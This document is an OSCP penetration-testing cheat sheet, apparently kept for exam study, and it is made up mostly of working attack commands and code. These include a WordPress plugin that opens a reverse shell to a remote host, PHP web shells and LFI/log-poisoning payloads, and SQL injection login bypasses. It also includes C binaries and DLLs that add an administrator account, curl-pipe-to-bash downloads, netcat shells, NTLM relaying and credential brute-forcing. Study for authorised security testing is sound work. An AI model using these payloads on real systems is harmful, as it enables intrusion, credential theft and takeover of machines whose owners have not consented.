# OSCP-Cheat-Sheet-2024
OSCP Cheat Sheet 2024
___

- [Reconnaissance](#reconnaissance)
	- [Nmap](#nmap)
- [Enumeration](#enumeration)
	- [Port 21 (FTP)](#port-21-ftp)
	- [Port 22 (SSH)](#port-22-ssh)
	- [Port 25 (SMTP)](#port-25-smtp)
	- [Port 53 (DNS)](#port-53-dns)
	- [Port 80-443 (HTTP-HTTPS)](#port-80-443-http-https)
	- [Port 111 (RPCBIND)](#port-111-rpcbind)
	- [Port 161 (SNMP)](#port-161-snmp)
	- [Port 445 (SMB)](#port-445-smb)
	- [Port 3306 (MYSQL)](#port-3306-mysql)
- [Exploitation](#exploitation)
	- [File Inclusion](#file-inclusion)
	- [Directory Traversal](#directory-traversal)
	- [SQL Injection](#sql-injection)
	- [File Upload](#file-upload)
- [Privilege Escalation](#privilege-escalation)
	- [Linux](#linux)
	- [Windows](#windows)
- [File Transfers](#file-transfers)
	- [Creating a Web Server](#creating-a-web-server)
	- [Linux](#linux)
	- [Windows](#windows)
- [Password Attacks](#password-attacks)
	- [Mutating Wordlists](#mutating-wordlists)
	- [Password Manager](#password-manager)
	- [Cracking NTLM hash](#cracking-ntlm-hash)
	- [Passing NTML hash](#passing-ntml-hash)
	- [Cracking Net-NTLMv2 hash](#cracking-net-ntlmv2-hash)
	- [Relaying Net-NTLMv2 hash](#relaying-net-ntlmv2-hash)
	- [Cracking MsCache hash](#cracking-mscache-hash)
- [Pivoting](#pivoting)
	- [SSH local port forwarding](#ssh-local-port-forwarding)
	- [SSH Remote Port Forwarding](#ssh-remote-port-forwarding)
	- [Chisel](#chisel)
- [Active Directory](#active-directory)
	- [Enumerating AD](#enumerating-ad)
	- [Attacking AD](#attacking-ad)


___

# Reconnaissance

## Nmap

### TCP

**Common 1,000 ports**
```
nmap -sV -sC -oN ./nmap.txt <<IP>>
```

**All ports**
```
nmap -sV -sC -p- -oN ./nmapAll.txt <<IP>> --max-retries=1
```
### UDP

```
sudo nmap -sU -sC -oN ./nmapUDP.txt <<IP>> --max-retries=1
```

**SNMP**
```
sudo nmap -sU -sC -p161 -oN ./nmapSNMP.txt <<IP>>
```

### Scripts

Location:
```
/usr/share/nmap/scripts/
```

#### Vulnerability Scanning

```
nmap --script vuln -oN nmapVuln.txt <<IP>>
```

#### Specific Script 

```
nmap -p <<PORT>> --script=<<SCRIPT_NAME>> <<IP>>
```

#### All Scripts

```
nmap -p <<PORT>> --script=all -oN nmapScripts.txt <<IP>>
```

# Enumeration

## Port 21 (FTP)

### Anonymous Access

```
ftp anonymous@<<IP>>
```
### Download file

```
ftp <IP>
PASSIVE
BINARY
get <FILE>
```
### Upload File

```
ftp <IP>
PASSIVE
BINARY
put <FILE>
```
### FTP Brute-Force

```
hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/rockyou.txt <<IP>> ftp
```

```
hydra -l <<USERNAME>> -P /usr/share/wordlists/rockyou.txt <<IP>> ftp
```

**Default Credentials**
```
hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <<IP>> ftp
```

**Specify Port**
```
hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/rockyou.txt <<IP>> -s <<PORT>> ftp
```



## Port 22 (SSH)

### SSH Brute-Force 

```
hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/rockyou.txt <<IP>> ssh
```

```
hydra -l joe -P /usr/share/wordlists/rockyou.txt <<IP>> ssh
```

```
hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt <<IP>> ssh
```

**Specify Port**
```
hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/rockyou.txt <<IP>> -s <<PORT>> ssh
```

### SSH Keys

#### Key Types

**RSA, DSA and ECDSA**
```
id_rsa
id_dsa
id_ecdsa
```

#### Keys Generation

```
ssh-keygen -t rsa
```

```
cat id_rsa.pub >> authorized_keys
```

#### Private Key Authentication

```
chmod 600 id_rsa
```

```
ssh -i id_rsa <<USERNAME>>@<<IP>>
```

#### Cracking SSH key

```
ssh2john id_rsa > ssh.hash
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```

### SSH backdoor

```
ssh-keygen -t rsa
```

```
echo <<CONTENTS OF PUBLIC KEY>> > <<PATH>>/.ssh/authorized_keys
```

```
ssh -i id_rsa <<USERNAME>>@<<IP>> 
```



## Port 25 (SMTP)

### Users Enumeration

```
smtp-user-enum -U <<USERNAME_LIST>> -t <<IP>>
```

### Credentials Brute-Force

```
hydra -L <<USERNAME_LIST>> -P <<PASSWORD_LIST>> <<IP>> pop3
```

```
hydra -L <<USERNAME_LIST>> -P <<PASSWORD_LIST>> <<IP>> imap
```

### Thunderbird Client

```
thunderbird
Settings -> Account Settings -> Account Actions -> Add Mail Account
```

### Sending Email

#### swaks

```
sudo swaks -t <<TARGET_EMAIL_ADRESS>> --from <<EMAIL_ADRESS>> --attach @<<FILE>> --server <<IP>> --body @<<TEXT_FILE>> --header "Subject: Example" --suppress-data -ap
```

#### sendmail

```
sendemail -t <<TARGET_EMAIL_ADRESS>> -f <<EMAIL_ADRESS>> -s <<IP>> -u "Password Reset" -o tls=no -m <<MESSAGE>>
```



## Port 53 (DNS)

### DNS Enumeration

```
dnsenum <DOMAIN>
```

```
dnsrecon -d <DOMAIN>
```
#### Any Record

```
dig ANY @<<IP>> <<DOMAIN>>
```

### Reverse Lookup

```
dig @<<IP>> -x <<IP>>
```


### Zone Transfer

```
dig axfr @<<IP>> <<DOMAIN>>
```





## Port 80-443 (HTTP-HTTPS)

### Automatic Scanners
#### Nikto

```
nikto -h <<URL>>
```
### Web Fuzzing
#### Initial Scan

```
dirsearch -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sql -u http://SERVER_IP:PORT
```
#### Directory Fuzzing

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -ic
```
#### Page Fuzzing

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ -ic
```

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php
```

```
gobuster dir -u http://SERVER_IP:PORT/directory -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt
```

#### Sub-domain Fuzzing

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.company.com/ -ic
```

#### Vhost Fuzzing

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -ic
```

#### Parameter Fuzzing - GET

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.company.com:PORT/admin/admin.php?FUZZ=key -fs xxx
```

#### Parameter Fuzzing - POST

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.company.com:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```
#### Value Fuzzing

```
ffuf -w ids.txt:FUZZ -u http://admin.company.com:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```

#### API Fuzzing

Simple pattern file for `gobuster`:
```
{GOBUSTER}/v1
{GOBUSTER}/v2
```

```
gobuster dir -u http://<<IP>>:<<PORT>> -w /usr/share/wordlists/dirb/big.txt -p pattern
```

##### Brute-force fuzzing login API

```
ffuf -u http://<<IP>>/login -X POST \  
-d ‘{"username":"USERFUZZ", "password":"PASSFUZZ"}’ \  
-w ./usernames.txt:USERFUZZ -w ./passwords.txt:PASSFUZZ
```

### DNS Records

Adding DNS record to `/etc/hosts` file:
```
sudo sh -c 'echo "<<SERVER_IP>>  company.com" >> /etc/hosts'
```

### WebDAV

**Connect to the `WebDav`server**
```
cadaver <<IP>>
```

```
dav:/> ls
dav:/> put <<FILE>>
```

### Wordpress

#### wpscan

```
wpscan --url <<IP>> --rua -e ap,at,tt,cb,dbe,u,m
```

**Plugins oriented**
```
wpscan --url <<URL>> --detection-mode aggressive --plugins-detection aggressive
```

**Brute-Force users**
```
wpscan --url <<URL>> -U users.txt -P /usr/share/wordlists/rockyou.txt
```

#### Fuzzing Wordpress Plugins

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt -u <<URL>> -ic
```

#### Wordpress Plugin RCE

Zip up this php file then upload and activate plugin. Wait for reverse shell. 

```
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/<<IP>>/<<PORT>> 0>&1'");
?>
```


## Port 111 (RPCBIND)

### Searching for NFS

```
rpcinfo <<IP>>
```

### Show Mounting Points

```
showmount -e <<IP>>
```

### Mount Share

```
mount -t nfs <<IP>>:/<<SHARE>> <<LOCAL_FOLDER>>
```

## Port 161 (SNMP)

### Nmap Scan

```
sudo nmap -sU --open -p 161 <<IP>> -oN open-snmp.txt
```
### Install MIBs

```
apt-get install snmp-mibs-downloader
download-mibs
# Edit the /etc/snmp/snmp.conf configuration file to deactivate the line that starts with the word "mibs".
```

### Brute-Force Community Strings

```
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <<IP>> snmp
```

### SNMP Enumeration

```
snmpbulkwalk -v2c -c public <<IP>> . > snmpbulkwalk.txt
```

```
snmpwalk -v1 -c public <<IP>> > snmpwalk.txt
```

**Extended**
```
snmpwalk -v1 -c public <<IP>> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```


## Port 445 (SMB)

### Smbclient

```
smbclient -N -L //IP ADRESS
```

```
smbclient \\\\IP ADRESS\\SHARE
```



## Port 3306 (MYSQL)

### Connecting Remotely

```
mysql -h <<IP>> -u <<USERNAME>> -p
```

### Connecting Locally

```
mysql -u <<USERNAME>> -p
```

### MYSQL Commands

```
show databases;
use <<DATABASE>>;
show tables;
select * from <<TABLE>>;
```

# Exploitation

## File Inclusion

### Local File Inclusion (LFI)


Two common readable files that are available on most back-end servers are `/etc/passwd` on Linux and `C:\Windows\boot.ini` on Windows.

#### LFI and File Uploads

##### Image upload

Crafting Malicious Image:
```
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

Once this file is uploaded, all we need to do is include it through the LFI vulnerability.
##### Zip Upload

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

Once we upload the `shell.jpg` archive, we can include it with the `zip` wrapper as (`zip://shell.jpg`)

```
zip://./profile_images/shell.jpg$cmd=id
```
##### Phar Upload

Write the following PHP script into a `shell.php` file:
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

Compile it into a `phar` file and rename it to `shell.jpg`:
```
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Now, we should have a `phar` file called `shell.jpg`. Once we upload it to the web application, we can simply call it with `phar://` and provide its URL path, and then specify the `phar` sub-file with `/shell.txt` (URL encoded) to get the output of the command we specify with (`&cmd=id`), as follows:

```
phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

### Basic Bypasses

**Non-Recursive Path Traversal Filters**
```
....//....//....//....//etc/passwd
```

**Encoding**
```
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

**Approved Paths**
```
./<EXISTING PATH>/../../../../etc/passwd
```

**Null Byte**
```
/etc/passwd%00
/etc/passwd%00.php
```

### PHP wrappers

#### Source Code Disclosure

**php://filter**
```
curl http://SERVER_IP:PORT/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```
#### Code execution

**data://** wrapper
```
curl "http://SERVER_IP:PORT/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```

**data://** wrapper with base64-encoded data
```
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==

curl "http://SERVER_IP:PORT/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

### Remote File Inclusion (RFI)

```
cat simple-backdoor.php
...
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
...
```

```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```
curl "http://SERVER_IP:PORT/index.php?page=http://<LOCAL-IP>/simple-backdoor.php&cmd=ls"
```

### Log Poisoning

Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log`. `Apache`logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows.

The following are some of the service logs we may be able to read:

- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`
#### Burp Request

After intercepting some web request we can modify the User Agent to include the PHP code snippet.

```
User-Agent: <?php system($_GET['cmd']); ?>
```

As the log should now contain PHP code, the LFI vulnerability should execute this code, and we should be able to gain remote code execution.

```
/index.php?page=/var/log/apache2/access.log&cmd=id
```

The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files.
#### Curl 

We may also poison the log by sending a request through `cURL`, as follows:
```
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```

### Automated Scanning

#### Fuzzing Parameters

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<<SERVER_IP>>:<<PORT>>/index.php?FUZZ=value' -fs <<FILE_SIZE>>
```

#### LFI wordlists

A good wordlist is [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), as it contains various bypasses and common files, so it makes it easy to run several tests at once. 

```
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<<SERVER_IP>>:<<PORT>>/index.php?page=FUZZ' -fs <<FILE_SIZE>>
```

#### Fuzzing Server Webroot

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<<SERVER_IP>>:<<PORT>>/index.php?language=../../../../FUZZ/index.php' -fs <<FILE_SIZE>>

...SNIP...

: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287
________________________________________________

/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
```


## Directory Traversal

### Linux 

Files to test directory traversal :
```
/etc/passwd
```
### Windows

Files to test directory traversal :
```
C:\Windows\System32\drivers\etc\hosts
```

If target system is running the _Internet Information Services_ (IIS) web server:
```
C:\inetpub\logs\LogFiles\W3SVC1\
C:\inetpub\wwwroot\web.config
```

### Encoding Special Characters

URL encoding:
```
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```
## SQL Injection

### SQLi Discovery

Try these payloads and see if it causes any errors or changes how the page behaves.

| Payload | URL Encoded |
| ------- | ----------- |
| `'`     | `%27`       |
| `"`     | `%22`       |
| `#`     | `%23`       |
| `;`     | `%3B`       |
| `)`     | `%29`       |

### Authentication Bypass

```
admin' or '1'='1
```

```
admin' OR 1=1 -- //
```

### Manual Code Execution

```
impacket-mssqlclient <<USERNAME>>:<<PASSWORD>>@<<IP>> -windows-auth
```

```
SQL> EXECUTE sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
```

With this feature enabled, we can execute any Windows shell command through the **EXECUTE** statement:

```
SQL> EXECUTE xp_cmdshell 'whoami';
```

#### Writing files on the web server via `SELECT INTO_OUTFILE` statement

```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

If successful we can access `webshell` on `http://<<IP>>/tmp/webshell.php`

## File Upload

### Bypass file extensions

**Other extensions**

```
PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module

ASP: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
```

### Magic Byte

 Insert at the start of the file to make it look as a .gif file:
```
GIF8;
GIF87a;
```


```
PNG : 89 50 4E 47 0D 0A 1A 0A 
JPG : FF D8 FF DB
```

# Privilege Escalation
## Linux

### Path Hijacking

```
export PATH=/tmp:$PATH
echo $PATH
```

### SUID binaries

```
find / -perm -u=s -type f 2>/dev/null
```

### Docker Breakout 

https://juggernaut-sec.com/docker-breakout-lpe/
#### Enumerating docker images

```
docker images
```

#### Spawning shell

https://gtfobins.github.io/gtfobins/docker/

This requires the user to be privileged enough to run docker, i.e. being in the `docker` group or being `root`.

```
./docker run -v /:/mnt --rm -it <<IMAGE_NAME>> chroot /mnt sh
```


## Windows

### Manual Enumeration

**Users privileges**
```
whoami /priv
```

**Groups membership**
```
whoami /groups
```

```
net localgroup
```

**Information about user**
```
net user <<USERNAME>>
```

**Information about system**
```
systeminfo
```

**List network interfaces**
```
ipconfig /all
```

**Display routing table**
```
route print
```

**List all active network connections**
```
netstat -ano
```

#### Powershell Commands

**Groups membership**
```powershell
Get-LocalGroup
```

```powershell
Get-LocalGroupMember <<GROUP_NAME>>
```

**Check installed applications**
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

**Review running processes**
```powershell
Get-Process
```

**PowerShell history of a user**
```powershell
Get-History
```

```powershell
(Get-PSReadlineOption).HistorySavePath
```

#### Stored Credentials

```
cmdkey /list
```

#### Search for Files with specific extensions

```
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.exe,*.zip,*.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
### Automated Enumeration

#### Winpeas

#### PowerUp

```
powershell -ep bypass
```

```
. .\PowerUp.ps1
```

```
Invoke-AllChecks
```


### Service Binary Hijacking

#### Enumerating File Permissions

```
icacls "<<FILE_PATH>>"
```

| MASK | PERMISSIONS             |
| ---- | ----------------------- |
| F    | Full access             |
| M    | Modify access           |
| RX   | Read and execute access |
| R    | Read-only access        |
| W    | Write-only access       |

#### Creating malicious binary 

Contents of `adduser.c` :
```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

#### Cross-compiling code for 64-bit version of windows. 

```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

#### Replacing vulnerable binary with malicious binary

```
iwr -uri http://<<IP>>/adduser.exe -Outfile adduser.exe
```

```
move .\adduser.exe <<VULNERABLE_BINARY>>
```

#### Check the Startup Type of the vulnerable service

```
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<<SERVICE_NAME>>'}
```

#### Starting vulnerable sevice

```
net stop <<SERVICE>>
```

```
net start <<SERVICE>>
```

```
net restart <<SERVICE>>
```

If `SeShutdownPrivilege` present:
```
shutdown /r /t 0 
```



### Service DLL Hijacking

####  Standard DLL search order

```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```

#### Displaying information about the running services

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

#### Displaying permissions on the binary

```
icacls <<SERVICE_BINARY>>
```

#### Creating malicious DLL

```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

#### Cross-Compile the C++ Code to a 64-bit DLL

```
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

#### Restarting Service 

```powershell
Restart-Service <<SERVICE_NAME>>
```

### Unquoted Service Paths

Let's show this in an example with the unquoted service binary path **C:\Program Files\My Program\My Service\service.exe**. When Windows starts the service, it will use the following order to try to start the executable file due to the spaces in the path.

```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

#### List services with binary path

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName 
```

```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

#### Check if you have permissions to restart service

```
Start-Service <<SERVICE_NAME>>
```

```
Stop-Service <<SERVICE_NAME>>
```

#### Check permissions on the parts of the full path

Since we can restart the service ourselves, we don't need to issue a reboot to restart the service. Next, let's list the paths Windows uses to attempt locating the executable file of the service.

```
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

```
icacls "C:\"
```

```
icacls "C:\Program Files"
```

```
icacls "C:\Program Files\Enterprise Apps"
```

#### Replacing binary for malicious one 

```
iwr -uri http://<<IP>>/adduser.exe -Outfile Current.exe
```

```
copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```

#### Start Service

```
Start-Service <<SERVICE_NAME>>
```
### Scheduled Tasks

```
schtasks /query /fo LIST /v
```

### Exploits

#### SeImpersonatePrivilege

##### PrintSpoofer

```
iwr -uri http://<<IP>>/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
```

```
.\PrintSpoofer64.exe -i -c powershell.exe
```

##### GodPotato

For GodPotato-NET4.exe to work you need to transfer nc.exe to victim machine.

```
iwr -uri http://<<IP>>:<<PORT>>/nc.exe -Outfile nc.exe
```

```
iwr -uri http://<<IP>>:<<PORT>>/GodPotato-NET4.exe -Outfile godpotato.exe
```

```
.\godpotato.exe -cmd "C:\Users\Public\nc.exe -e cmd.exe <<LHOST>> <<LPORT>>"
```




# File Transfers

## Creating a Web Server

### Python3

```
python3 -m http.server <<PORT>>
```
### PHP

```
php -S 0.0.0.0:<<PORT>>
```
### Ruby

```
ruby -run -ehttpd . -p<<PORT>>
```

## Linux
### Netcat

Receiver:
```
nc -nlvp 9989 > <<FILE>>
```

Sender:
```
nc -w 3 <<IP>> 9989 < <<FILE>>
```


Sender:
```
cat file > /dev/tcp/<<IP>>/<<PORT>>
```

Receiver:
```
nc -lnvp <<PORT>> > <<FILE>>
```


### Wget

```
wget http://<<IP>>:<<PORT>>/<<FILE>>
```

```
wget http://<<IP>>:<<PORT>>/<<FILE>> -O <<OUTPUT_FILE>>
```
#### Fileless Download

```
wget -qO- http://<<IP>>:<<PORT>>/<<FILE>>/script.py | python3
```
### Curl

```
curl http://<<IP>>:<<PORT>>/<<FILE>> -o <<OUTPUT_FILE>>
```
#### Fileless Download

```
curl http://<<IP>>:<<PORT>>/script.sh | bash
```

### SCP

#### Starting the SSH Server

Enabling the SSH Server
```
sudo systemctl enable ssh
```

Starting the SSH Server
```
sudo systemctl start ssh
```

#### Local to Remote machine

```
scp <<FILE>> <<USERNAME>>@<<IP>>:<<REMOTE_DIRECTORY>>
```

#### Remote to Local machine

```
scp <<USERNAME>>@<<IP>>:/<<FILE_LOCATION>> <<LOCAL_DIRECTORY>>
```

## Windows

### Certutil

```
certutil -urlcache -split -f "http://<<IP>>:<<IP>>/<<FILE>>" <<FILE>>
```

### Powershell

```
iwr -uri http://<<IP>>:<<PORT>>/<<FILE>> -Outfile <<FILE>>
```

```
Invoke-WebRequest http://<<IP>>:<<PORT>>/<<FILE>> -OutFile <<FILE>>
```

### SMBserver

On kali:
```
python3 ~/smbserver.py -smb2support myshare2 . -username user -password pass
```

On windows:
```
net use \\<<IP>>\myshare2
```

In file explorer you can access share on `\\<<IP>>\myshare2`





# Password Attacks

## Mutating Wordlists

Adding a "1" at the end of an existing password:
```
echo \$1 > example.rule
```

Display mutated passwords:
```
hashcat -r example.rule --stdout wordlist.txt
```

Adding "1" and "!" at the end of password + capitalization of first letter:
```
echo "$1 c $!" > example.rule
```

Adding "!" first then "1" at the end of the password + capitalization of first letter:
```
echo "$! $1 c" > example.rule
```

Provided rules:
```
ls -la /usr/share/hashcat/rules/
total 2588
-rw-r--r-- 1 root root    933 Dec 23 08:53 best64.rule
-rw-r--r-- 1 root root    666 Dec 23 08:53 combinator.rule
-rw-r--r-- 1 root root 200188 Dec 23 08:53 d3ad0ne.rule
-rw-r--r-- 1 root root 788063 Dec 23 08:53 dive.rule
-rw-r--r-- 1 root root 483425 Dec 23 08:53 generated2.rule
-rw-r--r-- 1 root root  78068 Dec 23 08:53 generated.rule
drwxr-xr-x 2 root root   4096 Feb 11 01:58 hybrid
-rw-r--r-- 1 root root 309439 Dec 23 08:53 Incisive-leetspeak.rule
-rw-r--r-- 1 root root  35280 Dec 23 08:53 InsidePro-HashManager.rule
-rw-r--r-- 1 root root  19478 Dec 23 08:53 InsidePro-PasswordsPro.rule
-rw-r--r-- 1 root root    298 Dec 23 08:53 leetspeak.rule
-rw-r--r-- 1 root root   1280 Dec 23 08:53 oscommerce.rule
-rw-r--r-- 1 root root 301161 Dec 23 08:53 rockyou-30000.rule
-rw-r--r-- 1 root root   1563 Dec 23 08:53 specific.rule
-rw-r--r-- 1 root root  64068 Dec 23 08:53 T0XlC-insert_00-99_1950-2050_toprules_0_F.rule
```

```
hashcat -m 1000 example.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## Password Manager

```
keepass2john Database.kdbx > keepass.hash
```

```
cat keepass.hash   
Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab16e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
```

First remove "Database" string from hash:

```
cat keepass.hash   
$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1b7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e...
```

Cracking KeePass hash:

```
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

## Cracking NTLM hash

```
hashcat -m 1000 admin.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## Passing NTML hash

#### Smbclient

```
smbclient \\\\<<IP>>\\secrets -U Administrator --pw-nt-hash <<NTML_HASH>>
```

#### Psexec

```
impacket-psexec -hashes 00000000000000000000000000000000:<<NTML_HASH>> Administrator@<<IP>>
```

#### Wmiexec

```
impacket-wmiexec -hashes 00000000000000000000000000000000:<<NTML_HASH>> Administrator@<<IP>>
```


## Cracking Net-NTLMv2 hash

Dir command to create SMB connection to our attacker machine:
```
C:\Windows\system32> dir \\<<IP>>\test
Access is denied.
```

Responder capturing the Net-NTLMv2 hash:
```
sudo responder -I tap0 
```

Cracking captured hash:
```
hashcat -m 5600 admin.hash /usr/share/wordlists/rockyou.txt --force
```

## Relaying Net-NTLMv2 hash

Starting `ntlmrelayx` with  PowerShell reverse shell one-liner set as command that will be executed. Port for reverse shell is set to 8080 in this instance.

```
impacket-ntlmrelayx --no-http-server -smb2support -t <<IP>> -c "powershell -enc JABjAGwAaQBlAG4AdA..." 
```

```
nc -nvlp 8080
```

Using the `dir` command to create an SMB connection to our Kali machine:
```
C:\Windows\system32>dir \\<<IP>>\test
```

We should receive connection in our `ntlmrelayx` tab and `netcat` should have caught the reverse shell.

## Cracking MsCache hash

```
lsadump::cache
```

```
